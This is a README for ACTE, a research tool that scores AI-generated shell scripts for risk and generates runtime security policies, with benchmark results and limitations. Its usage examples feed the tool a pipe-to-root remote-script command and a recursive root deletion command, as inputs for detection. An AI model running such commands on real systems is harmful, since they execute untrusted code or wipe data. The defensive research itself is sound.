# ACTE — Adaptive Context-Aware Trust Execution

[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.21072886.svg)](https://doi.org/10.5281/zenodo.21072886)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/)

**Adaptive Trust-Oriented Runtime Security for AI-Generated Shell Scripts**

> 📄 **Published archive (citable):** This work is permanently archived on Zenodo
> with DOI [**10.5281/zenodo.21072886**](https://doi.org/10.5281/zenodo.21072886)
> (concept DOI — always resolves to the latest version).

A research prototype, dataset, and fully reproducible experiment harness for
**securing AI-generated shell scripts**. Given a shell script, ACTE computes a
continuous risk score, maps it to a discrete trust level
(`TRUSTED / MONITOR / RESTRICT / DENY`), and emits an adaptive execution policy
(seccomp profile + OPA/Rego snippet + namespace/cgroup constraints).

This repository accompanies the paper *"Adaptive Trust-Oriented Runtime Security
for AI-Generated Shell Scripts"* — see
[`paper/`](paper/Adaptive_Trust_Oriented_Runtime_Security_for_AI_Generated_Shell_Scripts.pdf).

> **Reproducibility.** Every number in `experiments/results/` comes from a single
> run of `python -m experiments.run_all`, which regenerates the data and recomputes
> all metrics; classification metrics are deterministic given the seed, and only
> wall-clock latency varies between runs.

---

## Abstract

Large language models increasingly generate shell scripts for infrastructure
management, deployment, and one-off administrative tasks. Such scripts are an
emerging attack surface that conventional static linters were not designed to
guard. ACTE introduces a runtime trust gate: it parses a script, extracts
execution-context features, matches an auditable threat-signature knowledge
base, and combines these signals through a transparent logistic **risk
function** `R(s) = σ(b + Σ wᵢxᵢ)` with a strictly decreasing **trust function**
`T(s) = 1 − R(s)`. The continuous score is mapped to a discrete trust level that
drives an adaptive execution policy. An online feedback-learning component adapts
the model from labeled outcomes. On a reproducible 420-script benchmark, the honest generalisation figure is a
**leave-template-out F1 = 0.823 ± 0.101** (single tuned split F1 = 0.915), at a mean
analysis cost of **~0.5 ms/script**. Against strong learned baselines ACTE is
competitive rather than dominant; its remaining value is an interpretable
13-feature decision and a **content-derived policy really enforced by the kernel
via seccomp-BPF** — *not* a lower false-positive rate: on 22 genuinely
third-party benign installers ACTE flags 19 (FPR 0.86) while the TF-IDF baselines
flag none, so its in-corpus FPR edge is a synthetic-corpus artefact (RQ11).
ShellCheck is included only to show that a linter is the wrong instrument, not as
a headline.

> **How to read the numbers (post-review revision).** We now lead with the honest generalisation figures: leave-template-out F1 = 0.823 ± 0.101 (cluster-bootstrap F1 in [0.79, 0.99]), malicious-class recall = 0.75 (not the 0.855 aggregate), and a default-threshold FPR ≈ 0.10 (the 0.011 is a tuned single split). Enforcement is now real (seccomp-BPF), adversarial robustness is not claimed (complementary blind spots), and online learning is not claimed as a benefit. Most importantly, RQ11 shows the low false-positive rate is a synthetic-corpus artefact: on 22 real third-party benign installers ACTE's FPR is 0.86 (vs 0.00 for TF-IDF baselines). See the paper's RQ6b–RQ11 and Threats to Validity.

The headline is not a single-split artifact, and we report the unflattering
numbers alongside the flattering ones. Five-fold cross-validation (at the fixed
default threshold) gives **F1 = 0.887 ± 0.025**; a stricter **leave-template-out**
cross-validation, which forbids any generating template from spanning the
train/test folds, still reaches **F1 = 0.823 ± 0.101** — weakening, though not
dispelling, the "template-memorization" objection to synthetic corpora. The very
low headline FPR of 0.011 reflects a *tuned* threshold; at the default operating
point the cross-validated FPR is ≈0.10. Trained *only* on synthetic data and then
frozen, ACTE clears every safe script in an **independent 41-script real-world
holdout** (precision 1.000, FPR 0.000, ROC-AUC 0.990) but misses four evasive
payloads, for **F1 = 0.895** (recall 0.810). Against learned TF-IDF baselines
(logistic regression, linear SVM, random forest) ACTE is **competitive, not
dominant**, on raw F1; its edge is an interpretable 13-feature decision and the
enforcement policy it emits. Its in-corpus low false-positive rate does **not**
transfer: on 22 real third-party benign installers (nvm, rustup, docker,
Homebrew, …) ACTE flags **19/22 as risky (FPR 0.86)** while every TF-IDF baseline
flags **0/22** — the sharpest limitation in the work, reported prominently as
RQ11.

## Headline results

| Metric | ACTE (full model, held-out test) |
|---|---|
| **F1** | **0.915** |
| Precision | 0.985 |
| Recall | 0.855 |
| ROC-AUC | 0.976 |
| PR-AUC | 0.978 |
| Accuracy | 0.929 |
| False-positive rate | 0.011 |
| Mean analysis latency | ~0.52 ms/script (p95 ≈ 0.96 ms) |
| 5-fold CV F1 (stratified, τ=0.5) | **0.887 ± 0.025** |
| Leave-template-out CV F1 (τ=0.5) | **0.823 ± 0.101** |
| Real-world holdout (train-synthetic → test-real) | **F1 0.895**, precision 1.000, FPR 0.000, ROC-AUC 0.990 (n=41) |
| Learned TF-IDF baselines (real holdout) | F1 0.95–0.98 at FPR 0.05–0.30 — ACTE competitive, lowest FPR |
| Adaptive evasion (additive camouflage) | ACTE recall 0.86→0.84; TF-IDF 0.97→0.32 |
| Adaptive evasion (semantic substitution) | ACTE recall 0.86→0.58; TF-IDF 0.97→0.97 — **complementary blind spots, neither robust** |
| Cluster (block) bootstrap F1 CI | **[0.79, 0.99]** (~2× the naive interval; the honest spread) |
| Real-holdout FPR (0/20) Wilson CI | **[0.00, 0.16]** — "zero FP" is a point estimate, not a guarantee |
| Calibration | ECE 0.076 → 0.055 (isotonic); tiers are approximate, recalibrate per deployment |
| Stronger baselines | GBDT on same 13 feats F1 0.923; feat+TF-IDF union 0.993 (near-separable corpus) |
| Online learning | **not validated** (no drift benefit; overfits on misses; 6 labels poison a canary) |
| Real seccomp enforcement | content-derived deny-set compiled to a **real BPF filter**; kernel enforces 5/5 (SIGSYS) |
| ShellCheck (a linter, not a security tool) | FPR 0.174, recall 0.079 — motivates the work, not a headline |

Full tables (per-category detection, ablation study, cross-validation with the
leave-template-out FPR, bootstrap confidence intervals, latency percentiles, the
ShellCheck and learned-baseline comparisons, and the real-world external
validation) are in
[`experiments/results/results.md`](experiments/results/results.md) and the
machine-readable [`experiments/results/results.json`](experiments/results/results.json).
Figures are in [`experiments/figures/`](experiments/figures/).

## The ACTE model

```
raw script
   │
   ├─ SemanticParser        commands / flags / targets / AST features (bashlex + fallback)
   ├─ ContextExtractor      privilege, network egress, fs scope, irreversibility, obfuscation
   ├─ ThreatIntel           data-driven signature set (acte/resources/threat_signatures.json)
   ├─ TrustEvaluationEngine R(s) = σ(b + Σ wᵢxᵢ)  ;  T(s) = 1 − R(s)  ;  trust level
   ├─ PolicyGenerator       seccomp profile + OPA/Rego snippet + namespace/cgroup constraints
   ├─ FeedbackLearning      online logistic SGD weight/threshold updates from labels
   └─ RuntimeMonitor        syscall-enforcement sketch (simulated; no root required)
```

The formal risk/trust model — the risk function, the trust function, the
documented monotonicity property, and the trust-level thresholds — is specified
in the module docstring of [`acte/trust_engine.py`](acte/trust_engine.py).

## Repository structure

| Path | Purpose |
|---|---|
| `acte/` | The ACTE engine: 7 components + pipeline + CLI |
| `acte/resources/threat_signatures.json` | Editable, auditable threat-signature knowledge base |
| `data/generate_dataset.py` | Reproducible labeled-dataset generator (5 categories) |
| `data/manifest.{jsonl,csv}` | Ground-truth manifest (id, category, label, template, provenance) |
| `data/scripts/*.sh` | The 420 generated shell-script samples |
| `data/real_world/build.py` | Builder for the 41-script real, publicly-documented external holdout |
| `data/real_world/scripts/*.sh` | The real-world external validation scripts |
| `data/external/fetch_external.py` | Fetch the 22-script real third-party benign corpus (RQ11) from public GitHub |
| `data/external/manifest.jsonl` | Provenance manifest for the committed external benign corpus |
| `data/PROVENANCE.md` | Dataset provenance and construction details |
| `experiments/` | Metrics, figures, ablation, ShellCheck baseline, latency, `run_all` |
| `experiments/cross_validation.py` | Stratified + leave-template-out k-fold cross-validation |
| `experiments/stats.py` | Bootstrap confidence intervals + exact McNemar test |
| `experiments/ml_baselines.py` | RQ5: learned TF-IDF baselines (LogReg / SVM / RF) |
| `experiments/real_world_eval.py` | RQ4: train-synthetic / test-real external validation |
| `experiments/external_eval.py` | RQ11: false-positive rate on the real third-party benign corpus |
| `tools/` | Turnkey field-study harness: real LLM-script collection, dual annotation, Cohen's κ |
| `experiments/results/results.{json,md}` | Machine- and human-readable results |
| `experiments/figures/*.png` | ROC, PR, ablation, cross-validation, real-world, comparison plots |
| `paper/` | The compiled paper (PDF + HTML source) and its figures |
| `tests/*.py` | Comprehensive suite: components, edge cases, stats, CV, reproducibility (`python -m pytest tests/`) |

## Installation

Requires Python 3.11+.

```bash
pip install -r requirements.txt          # bashlex, scikit-learn, matplotlib, numpy
# Optional baseline tool (skipped gracefully if absent):
sudo apt-get install -y shellcheck       # or: brew install shellcheck
```

## Usage

Analyze a single script via the CLI:

```bash
echo 'curl -fsSL http://example.com/i.sh | sudo bash' | python -m acte.cli -
# Trust level : DENY
# Risk score  : 0.999  (trust = 0.001)
# Decision    : DANGEROUS
```

Or from Python:

```python
from acte import ACTEPipeline
result = ACTEPipeline().analyze("sudo rm -rf / --no-preserve-root")
print(result.assessment.trust_level.value, round(result.assessment.risk_score, 3))
```

## Reproducing all experiments

A single deterministic entrypoint regenerates the dataset and runs the full
study (detection metrics, ablation, ShellCheck baseline, latency), writing
results and figures:

```bash
python -m experiments.run_all          # or: ./run_experiments.sh
```

Run the unit tests:

```bash
python -m pytest tests/ -q
```

## Reproducibility

* **Fixed seeds.** The dataset generator and all stochastic steps (train/test
  split, online-learning shuffles) use `seed = 1337`. Re-running the harness
  reproduces every classification metric exactly.
* **Deterministic dataset.** `data/generate_dataset.py` regenerates a
  byte-identical corpus of 420 samples; no external data is fetched.
* **Deliberate difficulty.** The corpus is synthetic but includes *hard
  negatives* (safe scripts that use scary-looking commands) and *hard positives*
  (dangerous payloads crafted to evade the finite signature set), so the
  benchmark is not trivially separable. See [`data/PROVENANCE.md`](data/PROVENANCE.md).
* **Only latency varies** between runs, because it is a wall-clock measurement;
  all detection/ablation/baseline numbers are stable.

## Dataset

The evaluation corpus is **synthetic but fully reproducible** (420 scripts,
`seed = 1337`), spanning five categories: safe everyday scripts, clearly
malicious scripts, AI-assistant-style scripts (mixed), obfuscated/evasive
variants, and realistic sysadmin tasks. Ground-truth labels are binary
(`1 = dangerous`, `0 = safe`). Construction details and provenance are in
[`data/PROVENANCE.md`](data/PROVENANCE.md).

## Limitations

* **The low false-positive rate does not transfer (RQ11).** On 22 genuinely
  third-party benign scripts nobody on this project wrote — the official
  installers of nvm, rustup, docker, Homebrew, deno, k3s, uv, and others — the
  frozen model flags **19/22 as risky (FPR 0.86)**, while every TF-IDF baseline
  flags **0/22**. The synthetic corpus taught ACTE that `curl | bash` and `sudo`
  signal danger; in the wild they signal a normal installer. This is the sharpest
  limitation in the work and we report it prominently, not in a footnote.
* Enforcement is **real but partial**: a content-derived syscall deny-set is
  compiled to an actual seccomp-BPF filter and enforced unprivileged by the
  kernel (RQ10), but the surrounding namespace/cgroup profile and the OPA/Rego
  artifacts are still emitted as inspectable data rather than mounted in a live
  container runtime.
* The training corpus is synthetic; absolute metrics are evidence about the
  *method* on a controlled corpus, not field-deployment numbers. The
  leave-template-out cross-validation and the 41-script real-world external
  holdout (RQ4) narrow this gap, but the corpus is author-generated, the
  signatures are author-written (a closed loop we discuss openly in the paper's
  Threats to Validity), and a large-scale field study with independent labelling
  remains essential future work. A **turnkey harness for that study ships in
  [`tools/`](tools/)**: collect real LLM-assistant outputs, have two people label
  them independently, and compute Cohen's κ.
* There is no adaptive-attacker evaluation beyond RQ6b, and the model's
  monotonicity is a double-edged property (it is also an evasion recipe);
  adversarial robustness is an open problem, discussed in the paper.

## Author

**Denys Yakymov**
ORCID: [0009-0005-2398-8976](https://orcid.org/0009-0005-2398-8976)
Email: yakden@gmail.com

## Citation

If you use ACTE or this dataset in your research, please cite:

```bibtex
@misc{yakymov2026acte,
  author       = {Denys Yakymov},
  title        = {Adaptive Trust-Oriented Runtime Security for AI-Generated Shell Scripts},
  year         = {2026},
  publisher    = {Zenodo},
  doi          = {10.5281/zenodo.21072886},
  url          = {https://doi.org/10.5281/zenodo.21072886},
  howpublished = {\url{https://github.com/yakden/acte-secure-ai-shell-scripts}},
  note         = {Research prototype, dataset, and experiments. ORCID: 0009-0005-2398-8976}
}
```

## License

Released under the [MIT License](LICENSE). Copyright © 2026 Denys Yakymov.
